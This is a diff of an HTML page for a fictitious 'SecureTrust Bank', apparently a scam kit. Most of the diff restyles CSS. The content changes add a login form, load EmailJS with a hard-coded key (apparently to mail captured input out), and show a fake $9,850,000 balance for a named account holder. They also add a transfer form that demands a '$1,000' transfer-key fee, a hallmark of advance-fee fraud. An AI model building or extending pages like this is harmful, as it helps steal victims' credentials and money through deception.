@@ -3,54 +3,71 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WestFargo Bank - Secure Online Banking</title>
+    <title>SecureTrust Bank | Secure Online Banking</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Source+Sans+Pro:wght@300;400;600;700&display=swap" rel="stylesheet">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/[email protected]/dist/email.min.js"></script>
+    <script type="text/javascript">
+        (function() {
+            // Initialize EmailJS with your credentials
+            emailjs.init("4N487uelft3LuVq8p");
+        })();
+    </script>
     <style>
         :root {
-            --primary-blue: #00467f;
+            --primary-blue: #00447c;
             --secondary-blue: #0066b3;
-            --light-blue: #e6f2ff;
-            --accent-gold: #d4af37;
-            --dark-gray: #333333;
-            --medium-gray: #666666;
-            --light-gray: #f5f5f5;
+            --dark-blue: #002d5a;
+            --light-blue: #f0f7ff;
+            --accent-gold: #c29a2d;
+            --light-gold: #f8f2e4;
+            --dark-gray: #222222;
+            --medium-gray: #555555;
+            --light-gray: #f8f9fa;
+            --border-gray: #e1e5eb;
             --white: #ffffff;
-            --error-red: #d32f2f;
-            --success-green: #388e3c;
+            --error-red: #b71c1c;
+            --success-green: #2e7d32;
+            --shadow-light: rgba(0, 68, 124, 0.08);
+            --shadow-medium: rgba(0, 68, 124, 0.15);
         }
         
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         
         body {
             background-color: var(--light-gray);
             color: var(--dark-gray);
             line-height: 1.6;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
         }
         
         .container {
             max-width: 1200px;
             margin: 0 auto;
-            padding: 0 20px;
+            padding: 0 24px;
         }
         
         /* Header Styles */
         header {
             background-color: var(--white);
-            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.04);
             position: sticky;
             top: 0;
-            z-index: 100;
+            z-index: 1000;
+            border-bottom: 1px solid var(--border-gray);
         }
         
         .header-top {
-            background-color: var(--primary-blue);
+            background: linear-gradient(90deg, var(--dark-blue), var(--primary-blue));
             color: var(--white);
-            padding: 8px 0;
-            font-size: 0.9rem;
+            padding: 10px 0;
+            font-size: 0.85rem;
         }
         
         .header-top .container {
@@ -60,7 +77,7 @@
         }
         
         .header-bottom {
-            padding: 15px 0;
+            padding: 18px 0;
         }
         
         .header-bottom .container {
@@ -72,47 +89,66 @@
         .logo {
             display: flex;
             align-items: center;
+            gap: 12px;
         }
         
         .logo h1 {
-            font-size: 1.8rem;
-            color: var(--primary-blue);
-            margin-left: 10px;
+            font-family: 'Source Sans Pro', sans-serif;
+            font-size: 1.9rem;
+            font-weight: 700;
+            color: var(--dark-blue);
+            letter-spacing: -0.5px;
         }
         
         .logo-icon {
-            font-size: 2rem;
+            font-size: 2.2rem;
             color: var(--accent-gold);
         }
         
         nav ul {
             display: flex;
             list-style: none;
-        }
-        
-        nav ul li {
-            margin-left: 25px;
+            gap: 32px;
         }
         
         nav ul li a {
             text-decoration: none;
             color: var(--dark-gray);
             font-weight: 500;
-            transition: color 0.3s;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            padding: 8px 4px;
+            position: relative;
         }
         
         nav ul li a:hover {
             color: var(--primary-blue);
         }
         
+        nav ul li a:hover::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 100%;
+            height: 2px;
+            background-color: var(--primary-blue);
+        }
+        
         /* Main Content Styles */
         main {
-            padding: 30px 0;
+            padding: 40px 0;
             min-height: calc(100vh - 200px);
         }
         
         .page {
             display: none;
+            animation: fadeIn 0.4s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         
         .page.active {
@@ -121,166 +157,233 @@
         
         /* Login Page Styles */
         .login-container {
-            max-width: 450px;
-            margin: 50px auto;
+            max-width: 440px;
+            margin: 60px auto;
             background-color: var(--white);
-            border-radius: 8px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-            padding: 30px;
+            border-radius: 12px;
+            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.06);
+            padding: 40px;
+            border: 1px solid var(--border-gray);
         }
         
         .login-header {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 36px;
         }
         
         .login-header h2 {
-            color: var(--primary-blue);
-            margin-bottom: 10px;
+            color: var(--dark-blue);
+            margin-bottom: 12px;
+            font-size: 1.8rem;
+            font-weight: 600;
+        }
+        
+        .login-header p {
+            color: var(--medium-gray);
+            font-size: 1rem;
         }
         
         .form-group {
-            margin-bottom: 20px;
+            margin-bottom: 24px;
         }
         
         .form-group label {
             display: block;
-            margin-bottom: 8px;
+            margin-bottom: 10px;
             font-weight: 500;
+            color: var(--dark-gray);
+            font-size: 0.95rem;
         }
         
-        .form-group input {
+        .form-group input,
+        .form-group select,
+        .form-group textarea {
             width: 100%;
-            padding: 12px 15px;
-            border: 1px solid #ddd;
-            border-radius: 4px;
+            padding: 14px 16px;
+            border: 1.5px solid var(--border-gray);
+            border-radius: 8px;
             font-size: 1rem;
-            transition: border-color 0.3s;
+            transition: all 0.3s ease;
+            background-color: var(--white);
+            font-family: 'Inter', sans-serif;
         }
         
-        .form-group input:focus {
+        .form-group input:focus,
+        .form-group select:focus,
+        .form-group textarea:focus {
             border-color: var(--primary-blue);
             outline: none;
+            box-shadow: 0 0 0 3px rgba(0, 68, 124, 0.1);
         }
         
         .btn {
             display: inline-block;
-            background-color: var(--primary-blue);
+            background: linear-gradient(135deg, var(--primary-blue), var(--secondary-blue));
             color: var(--white);
             border: none;
-            padding: 12px 20px;
-            border-radius: 4px;
+            padding: 16px 24px;
+            border-radius: 8px;
             cursor: pointer;
             font-size: 1rem;
-            font-weight: 500;
-            transition: background-color 0.3s;
+            font-weight: 600;
+            transition: all 0.3s ease;
             text-align: center;
             width: 100%;
+            letter-spacing: 0.3px;
+            box-shadow: 0 4px 12px rgba(0, 68, 124, 0.15);
         }
         
         .btn:hover {
-            background-color: var(--secondary-blue);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(0, 68, 124, 0.2);
         }
         
         .btn-secondary {
-            background-color: var(--medium-gray);
+            background: var(--medium-gray);
         }
         
         .btn-secondary:hover {
-            background-color: var(--dark-gray);
+            background: var(--dark-gray);
         }
         
         /* Dashboard Styles */
         .dashboard-header {
-            margin-bottom: 30px;
+            margin-bottom: 36px;
         }
         
         .dashboard-header h2 {
-            color: var(--primary-blue);
-            margin-bottom: 10px;
+            color: var(--dark-blue);
+            margin-bottom: 8px;
+            font-size: 2.2rem;
+            font-weight: 700;
+            letter-spacing: -0.5px;
         }
         
         .welcome-message {
             color: var(--medium-gray);
+            font-size: 1.1rem;
         }
         
         .balance-card {
-            background: linear-gradient(135deg, var(--primary-blue), var(--secondary-blue));
+            background: linear-gradient(135deg, var(--dark-blue) 0%, var(--primary-blue) 100%);
             color: var(--white);
-            border-radius: 10px;
-            padding: 25px;
-            margin-bottom: 30px;
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            border-radius: 16px;
+            padding: 32px;
+            margin-bottom: 36px;
+            box-shadow: 0 8px 24px rgba(0, 44, 90, 0.15);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .balance-card::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            right: -30%;
+            width: 80%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 1px, transparent 1px);
+            background-size: 20px 20px;
+            transform: rotate(30deg);
         }
         
         .balance-label {
             font-size: 1rem;
-            margin-bottom: 10px;
+            margin-bottom: 12px;
             opacity: 0.9;
+            font-weight: 500;
+            letter-spacing: 0.5px;
         }
         
         .balance-amount {
-            font-size: 2.5rem;
-            font-weight: 600;
+            font-size: 3.2rem;
+            font-weight: 700;
+            font-family: 'Source Sans Pro', sans-serif;
+            letter-spacing: -1px;
+            margin-bottom: 4px;
         }
         
         .account-number {
-            margin-top: 15px;
+            margin-top: 20px;
             font-size: 0.9rem;
             opacity: 0.8;
+            font-weight: 500;
         }
         
         .quick-actions {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 20px;
-            margin-bottom: 30px;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 24px;
+            margin-bottom: 40px;
         }
         
         .action-card {
             background-color: var(--white);
-            border-radius: 8px;
-            padding: 20px;
+            border-radius: 12px;
+            padding: 28px 24px;
             text-align: center;
-            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.08);
+            box-shadow: 0 4px 16px var(--shadow-light);
             cursor: pointer;
-            transition: transform 0.3s, box-shadow 0.3s;
+            transition: all 0.3s ease;
+            border: 1px solid var(--border-gray);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
         
         .action-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            transform: translateY(-6px);
+            box-shadow: 0 8px 24px var(--shadow-medium);
+            border-color: var(--primary-blue);
         }
         
         .action-icon {
-            font-size: 2rem;
+            font-size: 2.4rem;
             color: var(--primary-blue);
-            margin-bottom: 15px;
+            margin-bottom: 20px;
+            background: var(--light-blue);
+            width: 70px;
+            height: 70px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 12px;
         }
         
         .action-card h3 {
-            margin-bottom: 10px;
-            color: var(--primary-blue);
+            margin-bottom: 12px;
+            color: var(--dark-blue);
+            font-size: 1.3rem;
+            font-weight: 600;
+        }
+        
+        .action-card p {
+            color: var(--medium-gray);
+            font-size: 0.95rem;
+            line-height: 1.5;
         }
         
         .transactions-section {
             background-color: var(--white);
-            border-radius: 8px;
-            padding: 25px;
-            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.08);
+            border-radius: 12px;
+            padding: 32px;
+            box-shadow: 0 4px 16px var(--shadow-light);
+            border: 1px solid var(--border-gray);
         }
         
         .section-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 20px;
-            padding-bottom: 15px;
-            border-bottom: 1px solid #eee;
+            margin-bottom: 28px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid var(--light-gray);
         }
         
         .section-header h3 {
-            color: var(--primary-blue);
+            color: var(--dark-blue);
+            font-size: 1.5rem;
+            font-weight: 600;
         }
         
         .transaction-list {
@@ -291,8 +394,15 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 15px 0;
-            border-bottom: 1px solid #eee;
+            padding: 20px 0;
+            border-bottom: 1px solid var(--border-gray);
+            transition: background-color 0.2s ease;
+        }
+        
+        .transaction-item:hover {
+            background-color: var(--light-gray);
+            margin: 0 -32px;
+            padding: 20px 32px;
         }
         
         .transaction-item:last-child {
@@ -300,17 +410,21 @@
         }
         
         .transaction-details h4 {
-            margin-bottom: 5px;
+            margin-bottom: 6px;
+            font-weight: 600;
+            color: var(--dark-gray);
+            font-size: 1.1rem;
         }
         
         .transaction-date {
             color: var(--medium-gray);
             font-size: 0.9rem;
+            font-weight: 500;
         }
         
         .transaction-amount {
-            font-weight: 600;
-            font-size: 1.1rem;
+            font-weight: 700;
+            font-size: 1.2rem;
         }
         
         .positive {
@@ -324,43 +438,48 @@
         /* Transfer Page Styles */
         .transfer-form {
             background-color: var(--white);
-            border-radius: 8px;
-            padding: 25px;
-            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.08);
-            max-width: 600px;
+            border-radius: 12px;
+            padding: 32px;
+            box-shadow: 0 4px 16px var(--shadow-light);
+            max-width: 680px;
             margin: 0 auto;
+            border: 1px solid var(--border-gray);
         }
         
         .transfer-form h2 {
-            color: var(--primary-blue);
-            margin-bottom: 20px;
+            color: var(--dark-blue);
+            margin-bottom: 28px;
             text-align: center;
+            font-size: 1.8rem;
+            font-weight: 600;
         }
         
         .form-row {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 15px;
+            gap: 20px;
         }
         
         .security-note {
-            background-color: var(--light-blue);
-            border-left: 4px solid var(--primary-blue);
-            padding: 15px;
-            margin: 20px 0;
-            border-radius: 4px;
+            background: linear-gradient(135deg, var(--light-blue), var(--white));
+            border-left: 4px solid var(--accent-gold);
+            padding: 20px;
+            margin: 24px 0;
+            border-radius: 8px;
+            font-size: 0.95rem;
+            border: 1px solid var(--border-gray);
         }
         
         /* Debit Card Page Styles */
         .debit-card-section {
             display: grid;
             grid-template-columns: 1fr 1fr;
-            gap: 30px;
+            gap: 36px;
         }
         
         .card-container {
-            perspective: 1000px;
-            height: 250px;
+            perspective: 1200px;
+            height: 260px;
         }
         
         .card {
@@ -368,7 +487,7 @@
             height: 100%;
             position: relative;
             transform-style: preserve-3d;
-            transition: transform 0.8s;
+            transition: transform 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
         
         .card.flipped {
@@ -380,13 +499,14 @@
             width: 100%;
             height: 100%;
             backface-visibility: hidden;
-            border-radius: 15px;
-            padding: 20px;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            border-radius: 20px;
+            padding: 24px;
+            box-shadow: 0 12px 32px rgba(0, 0, 0, 0.15);
+            overflow: hidden;
         }
         
         .card-front {
-            background: linear-gradient(135deg, var(--primary-blue), var(--secondary-blue));
+            background: linear-gradient(135deg, var(--dark-blue) 0%, var(--primary-blue) 100%);
             color: var(--white);
             display: flex;
             flex-direction: column;
@@ -394,7 +514,7 @@
         }
         
         .card-back {
-            background: linear-gradient(135deg, var(--secondary-blue), var(--primary-blue));
+            background: linear-gradient(135deg, var(--primary-blue) 0%, var(--dark-blue) 100%);
             color: var(--white);
             transform: rotateY(180deg);
             display: flex;
@@ -409,17 +529,25 @@
         }
         
         .card-chip {
-            width: 50px;
-            height: 40px;
-            background-color: var(--accent-gold);
-            border-radius: 5px;
+            width: 56px;
+            height: 44px;
+            background: linear-gradient(135deg, var(--accent-gold), #e6c87d);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--dark-blue);
+            font-weight: bold;
+            font-size: 0.8rem;
         }
         
         .card-number {
-            font-size: 1.5rem;
-            letter-spacing: 2px;
+            font-size: 1.8rem;
+            letter-spacing: 3px;
             text-align: center;
-            margin: 20px 0;
+            margin: 24px 0;
+            font-family: 'Source Sans Pro', sans-serif;
+            font-weight: 600;
         }
         
         .card-details {
@@ -433,57 +561,64 @@
         }
         
         .card-label {
-            font-size: 0.8rem;
+            font-size: 0.75rem;
             opacity: 0.8;
-            margin-bottom: 5px;
+            margin-bottom: 6px;
+            letter-spacing: 0.5px;
         }
         
         .card-stripe {
-            height: 40px;
+            height: 48px;
             background-color: var(--dark-gray);
-            margin-bottom: 20px;
+            margin-bottom: 24px;
         }
         
         .card-cvv {
             display: flex;
             justify-content: flex-end;
             align-items: center;
+            gap: 12px;
         }
         
         .cvv-box {
-            width: 60px;
-            height: 30px;
+            width: 70px;
+            height: 36px;
             background-color: var(--white);
             color: var(--dark-gray);
             display: flex;
             align-items: center;
             justify-content: center;
-            border-radius: 4px;
-            font-weight: 600;
+            border-radius: 6px;
+            font-weight: 700;
+            font-family: monospace;
         }
         
         .card-controls {
-            margin-top: 20px;
+            margin-top: 24px;
             text-align: center;
         }
         
         .card-info {
             background-color: var(--white);
-            border-radius: 8px;
-            padding: 25px;
-            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.08);
+            border-radius: 12px;
+            padding: 32px;
+            box-shadow: 0 4px 16px var(--shadow-light);
+            border: 1px solid var(--border-gray);
         }
         
         .card-info h3 {
-            color: var(--primary-blue);
-            margin-bottom: 20px;
+            color: var(--dark-blue);
+            margin-bottom: 24px;
+            font-size: 1.5rem;
+            font-weight: 600;
         }
         
         .info-item {
             display: flex;
             justify-content: space-between;
-            padding: 12px 0;
-            border-bottom: 1px solid #eee;
+            padding: 16px 0;
+            border-bottom: 1px solid var(--border-gray);
+            font-size: 0.95rem;
         }
         
         .info-item:last-child {
@@ -492,20 +627,24 @@
         
         /* Footer Styles */
         footer {
-            background-color: var(--primary-blue);
+            background: linear-gradient(135deg, var(--dark-blue) 0%, var(--primary-blue) 100%);
             color: var(--white);
-            padding: 30px 0;
+            padding: 48px 0 24px;
+            margin-top: 60px;
         }
         
         .footer-content {
             display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
-            gap: 30px;
+            grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+            gap: 36px;
+            margin-bottom: 40px;
         }
         
         .footer-section h3 {
-            margin-bottom: 15px;
-            font-size: 1.2rem;
+            margin-bottom: 20px;
+            font-size: 1.3rem;
+            font-weight: 600;
+            letter-spacing: 0.5px;
         }
         
         .footer-section ul {
@@ -513,26 +652,27 @@
         }
         
         .footer-section ul li {
-            margin-bottom: 10px;
+            margin-bottom: 12px;
         }
         
         .footer-section ul li a {
-            color: var(--light-blue);
+            color: rgba(255, 255, 255, 0.85);
             text-decoration: none;
-            transition: color 0.3s;
+            transition: all 0.3s ease;
+            font-weight: 400;
         }
         
         .footer-section ul li a:hover {
             color: var(--white);
+            padding-left: 4px;
         }
         
         .footer-bottom {
             text-align: center;
-            margin-top: 30px;
-            padding-top: 20px;
+            padding-top: 32px;
             border-top: 1px solid rgba(255, 255, 255, 0.1);
             font-size: 0.9rem;
-            color: var(--light-blue);
+            color: rgba(255, 255, 255, 0.7);
         }
         
         /* Modal Styles */
@@ -547,44 +687,98 @@
             z-index: 1000;
             align-items: center;
             justify-content: center;
+            backdrop-filter: blur(4px);
         }
         
         .modal.active {
             display: flex;
+            animation: fadeIn 0.3s ease;
         }
         
         .modal-content {
             background-color: var(--white);
-            border-radius: 8px;
-            padding: 30px;
-            max-width: 500px;
+            border-radius: 16px;
+            padding: 36px;
+            max-width: 520px;
             width: 90%;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 20px 48px rgba(0, 0, 0, 0.2);
+            border: 1px solid var(--border-gray);
         }
         
         .modal-header {
             display: flex;
             justify-content: space-between;
             align-items: center;
-            margin-bottom: 20px;
+            margin-bottom: 24px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid var(--light-gray);
         }
         
         .modal-header h3 {
-            color: var(--primary-blue);
+            color: var(--dark-blue);
+            font-size: 1.5rem;
+            font-weight: 600;
         }
         
         .close-modal {
             background: none;
             border: none;
-            font-size: 1.5rem;
+            font-size: 1.8rem;
             cursor: pointer;
             color: var(--medium-gray);
+            transition: color 0.3s ease;
+        }
+        
+        .close-modal:hover {
+            color: var(--dark-blue);
+        }
+        
+        /* Transfer Key Styles */
+        .transfer-key-info {
+            background: linear-gradient(135deg, var(--light-blue), var(--white));
+            padding: 20px 24px;
+            border-radius: 12px;
+            margin-bottom: 28px;
+            border-left: 4px solid var(--accent-gold);
+            border: 1px solid var(--border-gray);
+        }
+        
+        .transfer-key-info h4 {
+            color: var(--dark-blue);
+            margin-bottom: 12px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        /* Status Indicators */
+        .status-badge {
+            display: inline-block;
+            padding: 6px 14px;
+            border-radius: 20px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            letter-spacing: 0.3px;
+        }
+        
+        .status-active {
+            background-color: rgba(46, 125, 50, 0.1);
+            color: var(--success-green);
         }
         
         /* Responsive Styles */
+        @media (max-width: 992px) {
+            .balance-amount {
+                font-size: 2.8rem;
+            }
+        }
+        
         @media (max-width: 768px) {
             .debit-card-section {
                 grid-template-columns: 1fr;
+                gap: 32px;
             }
             
             .form-row {
@@ -592,11 +786,50 @@
             }
             
             nav ul {
-                display: none;
+                gap: 20px;
             }
             
-            .mobile-menu-btn {
-                display: block;
+            .container {
+                padding: 0 20px;
+            }
+            
+            .balance-amount {
+                font-size: 2.4rem;
+            }
+            
+            .quick-actions {
+                grid-template-columns: 1fr 1fr;
+                gap: 16px;
+            }
+        }
+        
+        @media (max-width: 576px) {
+            .login-container {
+                padding: 32px 24px;
+                margin: 40px auto;
+            }
+            
+            .quick-actions {
+                grid-template-columns: 1fr;
+            }
+            
+            .dashboard-header h2 {
+                font-size: 1.8rem;
+            }
+            
+            .balance-card {
+                padding: 24px;
+            }
+            
+            nav ul {
+                flex-direction: column;
+                gap: 16px;
+                align-items: flex-end;
+            }
+            
+            .footer-content {
+                grid-template-columns: 1fr;
+                gap: 32px;
             }
         }
     </style>
@@ -606,18 +839,18 @@
         <div class="header-top">
             <div class="container">
                 <div class="contact-info">
-                    <span>Customer Service: 1-800-WESTFARGO</span>
+                    <span><i class="fas fa-phone-alt"></i> Customer Service: 1-800-SECURE-TRUST</span>
                 </div>
                 <div class="security-info">
-                    <span>Secure Banking | FDIC Insured</span>
+                    <span><i class="fas fa-shield-alt"></i> Secure Banking | FDIC Insured</span>
                 </div>
             </div>
         </div>
         <div class="header-bottom">
             <div class="container">
                 <div class="logo">
-                    <div class="logo-icon">$</div>
-                    <h1>WestFargo Bank</h1>
+                    <div class="logo-icon"><i class="fas fa-shield-alt"></i></div>
+                    <h1>SecureTrust Bank</h1>
                 </div>
                 <nav>
                     <ul>
@@ -637,7 +870,7 @@
             <div id="login-page" class="page active">
                 <div class="login-container">
                     <div class="login-header">
-                        <h2>WestFargo Bank Online</h2>
+                        <h2>SecureTrust Bank Online</h2>
                         <p>Secure Login to Your Account</p>
                     </div>
                     <form id="login-form">
@@ -651,10 +884,10 @@
                         </div>
                         <button type="submit" class="btn">Login to Your Account</button>
                     </form>
-                    <div style="margin-top: 20px; text-align: center;">
-                        <a href="#" style="color: var(--primary-blue); text-decoration: none;">Forgot Username/Password?</a>
+                    <div style="margin-top: 24px; text-align: center;">
+                        <a href="#" style="color: var(--primary-blue); text-decoration: none; font-weight: 500;">Forgot Username/Password?</a>
                     </div>
-                    <div class="security-note" style="margin-top: 25px;">
+                    <div class="security-note" style="margin-top: 28px;">
                         <p><strong>Security Notice:</strong> We will never ask for your password or transfer key via email or phone.</p>
                     </div>
                 </div>
@@ -664,33 +897,33 @@
             <div id="dashboard-page" class="page">
                 <div class="dashboard-header">
                     <h2>Account Overview</h2>
-                    <p class="welcome-message">Welcome back, Beatrice Horan</p>
+                    <p class="welcome-message">Welcome back, Susan M Price</p>
                 </div>
                 
                 <div class="balance-card">
                     <div class="balance-label">Available Balance</div>
-                    <div class="balance-amount">$400,000.00</div>
+                    <div class="balance-amount">$9,850,000.00</div>
                     <div class="account-number">Account: •••• 4582</div>
                 </div>
                 
                 <div class="quick-actions">
                     <div class="action-card" data-page="transfer">
-                        <div class="action-icon">⇄</div>
+                        <div class="action-icon"><i class="fas fa-exchange-alt"></i></div>
                         <h3>Transfer Money</h3>
                         <p>Send money to other accounts</p>
                     </div>
                     <div class="action-card">
-                        <div class="action-icon">+</div>
+                        <div class="action-icon"><i class="fas fa-file-invoice-dollar"></i></div>
                         <h3>Pay Bills</h3>
                         <p>Pay your bills online</p>
                     </div>
                     <div class="action-card" data-page="debit-card">
-                        <div class="action-icon">💳</div>
+                        <div class="action-icon"><i class="fas fa-credit-card"></i></div>
                         <h3>Debit Card</h3>
                         <p>Manage your card</p>
                     </div>
                     <div class="action-card">
-                        <div class="action-icon">⚙️</div>
+                        <div class="action-icon"><i class="fas fa-cog"></i></div>
                         <h3>Services</h3>
                         <p>Account services</p>
                     </div>
@@ -699,43 +932,43 @@
                 <div class="transactions-section">
                     <div class="section-header">
                         <h3>Recent Transactions</h3>
-                        <a href="#" style="color: var(--primary-blue); text-decoration: none;">View All</a>
+                        <a href="#" style="color: var(--primary-blue); text-decoration: none; font-weight: 500;" id="view-all-transactions">View All</a>
                     </div>
-                    <ul class="transaction-list">
+                    <ul class="transaction-list" id="transaction-list">
                         <li class="transaction-item">
                             <div class="transaction-details">
-                                <h4>Direct Deposit - Salary</h4>
-                                <div class="transaction-date">July 1, 2025</div>
+                                <h4>Investment Return - Portfolio</h4>
+                                <div class="transaction-date">January 15, 2025</div>
                             </div>
-                            <div class="transaction-amount positive">+$12,500.00</div>
+                            <div class="transaction-amount positive">+$450,000.00</div>
                         </li>
                         <li class="transaction-item">
                             <div class="transaction-details">
-                                <h4>Online Purchase - Amazon</h4>
-                                <div class="transaction-date">June 28, 2025</div>
+                                <h4>Property Sale - 123 Main St</h4>
+                                <div class="transaction-date">January 5, 2025</div>
                             </div>
-                            <div class="transaction-amount negative">-$247.85</div>
+                            <div class="transaction-amount positive">+$3,200,000.00</div>
                         </li>
                         <li class="transaction-item">
                             <div class="transaction-details">
-                                <h4>ATM Withdrawal</h4>
-                                <div class="transaction-date">June 25, 2025</div>
+                                <h4>Luxury Watch Purchase</h4>
+                                <div class="transaction-date">January 2, 2025</div>
                             </div>
-                            <div class="transaction-amount negative">-$300.00</div>
+                            <div class="transaction-amount negative">-$47,850.00</div>
                         </li>
                         <li class="transaction-item">
                             <div class="transaction-details">
-                                <h4>Transfer to Savings</h4>
-                                <div class="transaction-date">June 20, 2025</div>
+                                <h4>Charitable Donation</h4>
+                                <div class="transaction-date">December 28, 2024</div>
                             </div>
-                            <div class="transaction-amount negative">-$1,000.00</div>
+                            <div class="transaction-amount negative">-$100,000.00</div>
                         </li>
                         <li class="transaction-item">
                             <div class="transaction-details">
-                                <h4>Interest Earned</h4>
-                                <div class="transaction-date">June 15, 2025</div>
+                                <h4>Dividend Payment - Tech Stocks</h4>
+                                <div class="transaction-date">December 15, 2024</div>
                             </div>
-                            <div class="transaction-amount positive">+$42.18</div>
+                            <div class="transaction-amount positive">+$42,180.00</div>
                         </li>
                     </ul>
                 </div>
@@ -748,25 +981,51 @@
                     <p class="welcome-message">Send money to other accounts</p>
                 </div>
                 
+                <div class="transfer-key-info">
+                    <h4><i class="fas fa-key"></i> Secure Transfer Key Required</h4>
+                    <p>Your SecureTrust Bank transfer key is a unique 8-character code. This is different from your PIN and provides an additional layer of security for your transactions.</p>
+                </div>
+                
                 <div class="transfer-form">
                     <h2>External Transfer</h2>
                     <form id="transfer-form">
                         <div class="form-group">
-                            <label for="from-account">From Account</label>
-                            <select id="from-account" class="form-control" required>
-                                <option value="">Select Account</option>
-                                <option value="checking">Checking •••• 4582 ($400,000.00)</option>
-                                <option value="savings">Savings •••• 7821 ($15,250.00)</option>
+                            <label for="sender-account">Sender Account</label>
+                            <select id="sender-account" class="form-control" required>
+                                <option value="">Select Sender Account</option>
+                                <option value="susan-price-checking">Susan M Price - Checking (••••4582)</option>
+                                <option value="susan-price-savings">Susan M Price - Savings (••••7821)</option>
+                                <option value="susan-price-investment">Susan M Price - Investment (••••2391)</option>
+                                <option value="susan-price-trust">Price Family Trust (••••6678)</option>
                             </select>
                         </div>
                         
                         <div class="form-group">
-                            <label for="to-bank">To Bank</label>
-                            <input type="text" id="to-bank" name="to-bank" placeholder="Bank Name" required>
+                            <label for="sender-name">Sender Name</label>
+                            <input type="text" id="sender-name" name="sender-name" placeholder="Sender Full Name" required>
                         </div>
                         
                         <div class="form-group">
-                            <label for="to-account">To Account Number</label>
+                            <label for="receiver-name">Receiver Name</label>
+                            <input type="text" id="receiver-name" name="receiver-name" placeholder="Receiver Full Name" required>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="to-bank">Receiver Bank</label>
+                            <select id="to-bank" name="to-bank" required>
+                                <option value="">Select Receiver Bank</option>
+                                <option value="Chase Bank">Chase Bank</option>
+                                <option value="Bank of America">Bank of America</option>
+                                <option value="Wells Fargo">Wells Fargo</option>
+                                <option value="Citibank">Citibank</option>
+                                <option value="J.P. Morgan">J.P. Morgan</option>
+                                <option value="HSBC">HSBC</option>
+                                <option value="Other Bank">Other Bank</option>
+                            </select>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label for="to-account">Receiver Account Number</label>
                             <input type="text" id="to-account" name="to-account" placeholder="Account Number" required>
                         </div>
                         
@@ -781,6 +1040,8 @@
                                 <option value="">Select Account Type</option>
                                 <option value="checking">Checking</option>
                                 <option value="savings">Savings</option>
+                                <option value="investment">Investment</option>
+                                <option value="trust">Trust</option>
                             </select>
                         </div>
                         
@@ -795,14 +1056,19 @@
                             </div>
                         </div>
                         
+                        <div class="form-group">
+                            <label for="transfer-description">Transfer Description (Optional)</label>
+                            <textarea id="transfer-description" name="transfer-description" rows="2" placeholder="e.g., Investment, Real estate purchase, Business transaction"></textarea>
+                        </div>
+                        
                         <div class="security-note">
-                            <p><strong>Security Verification:</strong> For your protection, a transfer key is required to complete this transaction.</p>
+                            <p><strong>Security Verification:</strong> For your protection, a SecureTrust Bank transfer key is required to complete this transaction.</p>
                         </div>
                         
                         <div class="form-group">
-                            <label for="transfer-key">Transfer Key</label>
-                            <input type="password" id="transfer-key" name="transfer-key" placeholder="Enter your transfer key" required>
-                            <small style="color: var(--medium-gray);">Your transfer key is a 6-digit number provided by the bank.</small>
+                            <label for="transfer-key">SecureTrust Transfer Key Fee $1,000</label>
+                            <input type="password" id="transfer-key" name="transfer-key" placeholder="Enter your 8-character transfer key" required>
+                            <small style="color: var(--medium-gray);">Your transfer key is a unique 8-character code purchase by the bank fee $1,000.</small>
                         </div>
                         
                         <button type="submit" class="btn">Initiate Transfer</button>
@@ -814,7 +1080,7 @@
             <div id="debit-card-page" class="page">
                 <div class="dashboard-header">
                     <h2>Debit Card Management</h2>
